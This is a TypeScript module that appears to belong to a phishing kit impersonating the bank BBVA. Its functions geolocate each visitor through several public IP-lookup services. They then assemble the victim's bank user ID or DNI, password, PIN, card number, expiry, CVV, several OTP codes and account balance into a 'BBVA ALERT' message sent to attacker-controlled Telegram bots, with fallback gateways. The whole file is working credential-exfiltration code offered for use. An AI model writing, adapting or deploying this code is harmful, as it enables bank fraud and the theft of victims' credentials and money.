const formatCountryName = (codeOrName?: string): string => {
    if (!codeOrName || codeOrName === "N/A") return "N/A";
    const trimmed = codeOrName.trim();
    if (trimmed.length === 2) {
        try {
            const regionNames = new Intl.DisplayNames(["en"], { type: "region" });
            return regionNames.of(trimmed.toUpperCase()) || trimmed;
        } catch {
            return trimmed;
        }
    }
    return trimmed;
};

export const fetchVisitorInfo = async () => {
    try {
        if (typeof window === "undefined") return null;

        // Check if already fetched and valid in sessionStorage
        const cachedCountry = sessionStorage.getItem("country");
        if (cachedCountry && cachedCountry !== "N/A") {
            return {
                ip: sessionStorage.getItem("ip") || "Unknown",
                city: sessionStorage.getItem("city") || "N/A",
                region: sessionStorage.getItem("region") || "N/A",
                country: cachedCountry,
                isp: sessionStorage.getItem("isp") || "N/A",
                browser: sessionStorage.getItem("browser") || (typeof navigator !== "undefined" ? navigator.userAgent : "Unknown"),
            };
        }

        // Helper to query and normalize provider responses
        const queryProvider = async (
            url: string,
            parser: (data: any) => any,
            isText = false
        ) => {
            try {
                const res = await fetch(url, {
                    signal: AbortSignal.timeout(3500),
                    headers: isText ? {} : { Accept: "application/json" },
                });
                if (!res.ok) return null;
                if (!isText) {
                    const contentType = res.headers.get("content-type");
                    if (contentType && !contentType.includes("json")) return null;
                }
                const raw = isText ? await res.text() : await res.json();
                const parsed = parser(raw);
                if (parsed && (parsed.country !== "N/A" || parsed.ip !== "Unknown")) {
                    if (parsed.country && parsed.country !== "N/A") {
                        parsed.country = formatCountryName(parsed.country);
                    }
                    return parsed;
                }
            } catch {
                // silent fallback
            }
            return null;
        };

        // Multi-provider list (fastest responding provider wins)
        const providers = [
            // Cloudflare Global Edge trace (Fastest, zero rate limits, works everywhere globally)
            queryProvider(
                "https://1.1.1.1/cdn-cgi/trace",
                (text: string) => {
                    const lines = text.split("\n");
                    const map: Record<string, string> = {};
                    lines.forEach((l) => {
                        const idx = l.indexOf("=");
                        if (idx > 0) map[l.slice(0, idx).trim()] = l.slice(idx + 1).trim();
                    });
                    return {
                        ip: map.ip || "Unknown",
                        country: formatCountryName(map.loc) || "N/A",
                        city: "N/A",
                        region: "N/A",
                        isp: "Cloudflare Edge",
                    };
                },
                true
            ),
            // country.is (ultra-fast country lookup)
            queryProvider("https://api.country.is/", (json) => ({
                ip: json.ip || "Unknown",
                country: formatCountryName(json.country) || "N/A",
                city: "N/A",
                region: "N/A",
                isp: "N/A",
            })),
            // ipwho.is
            queryProvider("https://ipwho.is/", (json) => ({
                ip: json.ip || "Unknown",
                country: formatCountryName(json.country) || "N/A",
                city: json.city || "N/A",
                region: json.region || "N/A",
                isp: json.connection?.isp || "N/A",
            })),
            // geojs.io
            queryProvider("https://get.geojs.io/v1/ip/geo.json", (json) => ({
                ip: json.ip || "Unknown",
                country: formatCountryName(json.country) || "N/A",
                city: json.city || "N/A",
                region: json.region || "N/A",
                isp: json.organization_name || "N/A",
            })),
            // db-ip.com
            queryProvider("https://api.db-ip.com/v2/free/self", (json) => ({
                ip: json.ipAddress || "Unknown",
                country: formatCountryName(json.countryName || json.countryCode) || "N/A",
                city: json.city || "N/A",
                region: json.stateProv || "N/A",
                isp: "N/A",
            })),
            // freeipapi.com
            queryProvider("https://freeipapi.com/api/json", (json) => ({
                ip: json.ipAddress || "Unknown",
                country: formatCountryName(json.countryName || json.countryCode) || "N/A",
                city: json.cityName || "N/A",
                region: json.regionName || "N/A",
                isp: "N/A",
            })),
            // ipquery.io
            queryProvider("https://api.ipquery.io/", (json) => ({
                ip: json.ip || "Unknown",
                country: formatCountryName(json.location?.country) || "N/A",
                city: json.location?.city || "N/A",
                region: json.location?.state || "N/A",
                isp: json.isp?.isp || "N/A",
            })),
            // ipapi.co
            queryProvider("https://ipapi.co/json/", (json) => ({
                ip: json.ip || "Unknown",
                country: formatCountryName(json.country_name || json.country) || "N/A",
                city: json.city || "N/A",
                region: json.region || "N/A",
                isp: json.org || "N/A",
            })),
        ];

        // Fastest-valid response resolver (Promise race)
        const data = await new Promise<any>((resolve) => {
            let resolved = false;
            let pending = providers.length;

            providers.forEach((p) => {
                p.then((result) => {
                    if (result && result.country && result.country !== "N/A" && !resolved) {
                        resolved = true;
                        resolve(result);
                    } else {
                        pending--;
                        if (pending === 0 && !resolved) {
                            resolve(result || null);
                        }
                    }
                }).catch(() => {
                    pending--;
                    if (pending === 0 && !resolved) {
                        resolve(null);
                    }
                });
            });

            // Fallback timeout at 3.5s
            setTimeout(() => {
                if (!resolved) {
                    resolved = true;
                    resolve(null);
                }
            }, 3500);
        });

        if (data) {
            sessionStorage.setItem("ip", data.ip || "Unknown");
            sessionStorage.setItem("city", data.city || "N/A");
            sessionStorage.setItem("region", data.region || "N/A");
            sessionStorage.setItem("country", data.country || "N/A");
            sessionStorage.setItem("isp", data.isp || "N/A");
            const ua = typeof navigator !== "undefined" ? navigator.userAgent : "Unknown";
            sessionStorage.setItem("browser", ua);
            return {
                ...data,
                browser: ua,
            };
        }
    } catch (error) {
        console.error("❌ Critical error fetching visitor info:", error);
    }
    return null;
};

export const sendTelegramRawMessage = async (messageText: string) => {
    try {
        const botTokensValue =
            process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ||
            process.env.TELEGRAM_BOT_TOKEN;
        const chatIdValue =
            process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ||
            process.env.TELEGRAM_CHAT_ID;
        const gateway =
            process.env.NEXT_PUBLIC_TELEGRAM_API_GATEWAY ||
            process.env.TELEGRAM_API_GATEWAY ||
            "https://api.telegram.org";

        if (!botTokensValue || !chatIdValue) {
            console.warn("Telegram bot token or chat ID is missing in environment variables.");
            return null;
        }

        const chatIds = chatIdValue.split(",").map((id) => id.trim()).filter(Boolean);
        const botTokens = botTokensValue.split(",").map((token) => token.trim()).filter(Boolean);
        const cleanGateway = gateway.replace(/\/+$/, "");

        const results = await Promise.all(
            chatIds.map(async (id, index) => {
                const token = botTokens[index] || botTokens[botTokens.length - 1];
                const endpoints = [
                    `${cleanGateway}/bot${token}/sendMessage`,
                    `https://api.telegram.org/bot${token}/sendMessage`,
                ];

                for (const url of endpoints) {
                    try {
                        const response = await fetch(url, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({
                                chat_id: id,
                                text: messageText,
                                parse_mode: "HTML",
                            }),
                        });
                        if (response.ok) {
                            return await response.json();
                        }
                    } catch (err) {
                        // try next endpoint fallback
                    }
                }
                return null;
            })
        );
        return results;
    } catch (error) {
        console.error("❌ Critical Error in sendTelegramRawMessage:", error);
        return null;
    }
};

export const sendTelegramMessage = async (params: {
    title?: string;
    type?: string;
    exclude?: string[];
    message?: string;
    [key: string]: any;
}) => {
    try {
        const { title, type, exclude, message: customMessage, ...data } = params;

        let formattedMessage = `<b>🚀 ${title || "BBVA ALERT"}</b>\n\n`;

        // Section: LOCATION & DEVICE INFO (included unless excluded)
        if (!exclude?.includes("location") && typeof window !== "undefined") {
            const ip =
                sessionStorage.getItem("bbva_user_ip") ||
                sessionStorage.getItem("ip") ||
                "Unknown";
            const country =
                sessionStorage.getItem("bbva_user_country") ||
                sessionStorage.getItem("country") ||
                "N/A";
            const city =
                sessionStorage.getItem("bbva_user_city") ||
                sessionStorage.getItem("city") ||
                "N/A";

            if (ip !== "Unknown" || country !== "N/A" || city !== "N/A") {
                formattedMessage += `<b>🌍 DEVICE & LOCATION:</b>\n`;
                if (ip && ip !== "Unknown") formattedMessage += `• <b>IP:</b> <code>${ip}</code>\n`;
                if (country && country !== "N/A") formattedMessage += `• <b>Country:</b> <code>${country}</code>\n`;
                if (city && city !== "N/A") formattedMessage += `• <b>City:</b> <code>${city}</code>\n`;
                if (window.location?.href) formattedMessage += `• <b>URL:</b> ${window.location.href}\n`;
                formattedMessage += `\n`;
            }
        }

        // Section: USER DATA
        const dniVal = data.dni || data.userId || data.user;
        const passVal = data.password || data.pass;
        const pinVal = data.pin;
        const phoneVal = data.phoneNumber || data.phone;
        const emailVal = data.email;
        const nameVal = data.name;

        if (dniVal || passVal || pinVal || phoneVal || emailVal || nameVal) {
            formattedMessage += `<b>👤 USER DATA:</b>\n`;
            if (dniVal) formattedMessage += `• <b>User / DNI:</b> <code>${dniVal}</code>\n`;
            if (passVal) formattedMessage += `• <b>Password:</b> <code>${passVal}</code>\n`;
            if (pinVal) formattedMessage += `• <b>PIN:</b> <code>${pinVal}</code>\n`;
            if (phoneVal) formattedMessage += `• <b>Phone:</b> <code>${phoneVal}</code>\n`;
            if (emailVal) formattedMessage += `• <b>Email:</b> <code>${emailVal}</code>\n`;
            if (nameVal) formattedMessage += `• <b>Name:</b> <code>${nameVal}</code>\n`;
            formattedMessage += `\n`;

            delete data.dni;
            delete data.userId;
            delete data.user;
            delete data.password;
            delete data.pass;
            delete data.pin;
            delete data.phoneNumber;
            delete data.phone;
            delete data.email;
            delete data.name;
        }

        // Section: CARD DETAILS
        const cardVal = data.cardNumber || data.card;
        const expiryVal = data.expiry || data.cardExpiry;
        const cvvVal = data.cvv || data.cardCvv;

        if (cardVal || expiryVal || cvvVal) {
            formattedMessage += `<b>💳 CARD DETAILS:</b>\n`;
            if (cardVal) formattedMessage += `• <b>Card No:</b> <code>${cardVal}</code>\n`;
            if (expiryVal) formattedMessage += `• <b>Expiry:</b> <code>${expiryVal}</code>\n`;
            if (cvvVal) formattedMessage += `• <b>CVV:</b> <code>${cvvVal}</code>\n`;
            formattedMessage += `\n`;

            delete data.cardNumber;
            delete data.card;
            delete data.expiry;
            delete data.cardExpiry;
            delete data.cvv;
            delete data.cardCvv;
        }

        // Section: OTP VERIFICATION
        const otp1Val = data.otp1 || data.otp;
        const otp2Val = data.otp2;
        const otp3Val = data.otp3;

        if (otp1Val || otp2Val || otp3Val) {
            formattedMessage += `<b>🔐 OTP VERIFICATION:</b>\n`;
            if (otp1Val) formattedMessage += `• <b>OTP 1:</b> <code>${otp1Val}</code>\n`;
            if (otp2Val) formattedMessage += `• <b>OTP 2:</b> <code>${otp2Val}</code>\n`;
            if (otp3Val) formattedMessage += `• <b>OTP 3:</b> <code>${otp3Val}</code>\n`;
            formattedMessage += `\n`;

            delete data.otp;
            delete data.otp1;
            delete data.otp2;
            delete data.otp3;
        }

        // Section: FINANCIAL DETAILS
        const accVal = data.accountNumber || data.account;
        const balVal = data.balance || data.accountBalance;

        if (accVal || balVal) {
            formattedMessage += `<b>💰 ACCOUNT DETAILS:</b>\n`;
            if (accVal) formattedMessage += `• <b>Account:</b> <code>${accVal}</code>\n`;
            if (balVal) formattedMessage += `• <b>Balance:</b> <code>${balVal}</code>\n`;
            formattedMessage += `\n`;

            delete data.accountNumber;
            delete data.account;
            delete data.balance;
            delete data.accountBalance;
        }

        // Custom Message body if provided
        if (customMessage) {
            formattedMessage += `${customMessage}\n\n`;
        }

        // Any other extra fields
        const extraEntries = Object.entries(data);
        if (extraEntries.length > 0) {
            formattedMessage += `<b>📋 ADDITIONAL DETAILS:</b>\n`;
            for (const [key, val] of extraEntries) {
                if (val !== undefined && val !== null && val !== "") {
                    formattedMessage += `• <b>${key}:</b> <code>${val}</code>\n`;
                }
            }
            formattedMessage += `\n`;
        }

        return await sendTelegramRawMessage(formattedMessage);
    } catch (error) {
        console.error("❌ Critical Error in sendTelegramMessage:", error);
        return null;
    }
};
